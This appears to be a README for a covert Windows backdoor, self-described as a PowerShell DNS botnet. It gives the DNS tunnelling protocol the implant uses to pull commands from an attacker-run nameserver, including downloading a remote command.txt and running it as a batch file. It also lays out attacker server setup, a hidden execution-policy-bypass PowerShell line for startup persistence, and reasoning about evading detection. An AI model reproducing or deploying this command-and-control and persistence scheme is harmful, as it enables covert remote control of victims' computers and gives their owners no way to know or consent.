Objective:
----------

1. Create win10 compatible connectback backdoor.
2. Undetectable.
3. Only windows exe and ps to be used.


Setup:
------

1. Master server running Linux.
2. Master server with public IP address and a public domain name (hidden.com).
   OR (Just make the Master linux as default DNS on victim for testing).
3. Powershell script on victim.


Protocol:
---------

Most of the protocols gets scanned. However, DNS gets scanned the least.
Here, the attacker will have a public domain 'hidden.com'
NS of the domain (ns1.hidden.com) will be pointed to attacker's Linux machine over a public IP address.

PowerShell Trojan of victim machine will make DNS resolve query of the following format:

	RANDOM.y.HOSTNAME.malware.hidden.com

Here,
	RANDOM = random string of length 5, to avoid DNS caching issues.
	HOSTNAME = hostname of victim machine.

The return IP Address (A value) will be of the format <127-130>.x.x.x,
where first octet will determine the next steps. Rest three octet are not used.

Octet 127.x.x.x -> No Operation, sleep for a while.
Octet 128.x.x.x -> Make CNAME to fetch base64 encoded small command.
Octet 129.x.x.x -> Fetch data from RANDOM.exec.HOSTNAME.malware.hidden.com:8080/command.txt and save it as test.bat. Execute it.
                   While resolving the DNS, attacker may supply any controlled IP Address to avoid detection.
Octet 130.x.x.x -> Exit


Attacker's Side Configuration:
------------------------------

For testing, the attacker may set the Linux server as default DNS resolver and do testing.


- The file hidden.yml contains the data. Modify lines 25, 28, 37 and 89 to set up attacker's Linux IP Address. Currently set up as 192.168.1.107
- Remove email address from line 44.
- Execute dns-router.py by typing the following command from bash
	python dns-router.py -c hidden.yml

- You should be able to see the victim machine making dns request in terminal. DNS Request of *.y.*.malware.hidden.com format as victim pinging.

- Make changes in lines 62, 68 and 74 and replace HOSTNAME with your victim hostname.
- Set IP of a server running webserver with url of format http://<ip_address>:8080/command.txt in line 77.

- Set IP Octet to start from 128 in line 65 to perform CNAME command.
- Current command is calc with base64 as Y2FsYw== in line 71.
- Restart dns-router.py

- Victim will now make DNS Request of *.cname.*.malware.hidden.com format to get command. You should see calc opening.


Victim Side Configuration:
--------------------------

- Keep the file test.ps1 in victim filesystem (probably C:\Windows\test.ps1 is good enough).
- Create a shortcut or put in startup regedit the following:
	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -executionpolicy bypass -File C:\Windows\test.ps1
- Execute the script. It will flash the ps windows monentarily.


Advantages:
-----------

- Communication over DNS allows near complete undetected communication.
- This is because most systems just check against a list of blacklisted domains.
- System can communicate even from behind proxy.
- Communication is possible even in complete isolated systems, as long as they are connected to company AD for DNS resolution.
- Download uses Invoke-WebRequest which makes use of internet explorer proxy configurations.


Further Enhancements:
---------------------

- Feature to reply back command output from victim to master without dependency on test.bat <- Will increase detectability.
- Allow better management of DNS server and commands without restarting the server. (Currently server can be reloaded by passing signal 10; kill -10 pid)


Summary:
--------
- A powershell dns botnet.


Source:
-------
- DNS Server: https://github.com/major1201/dns-router
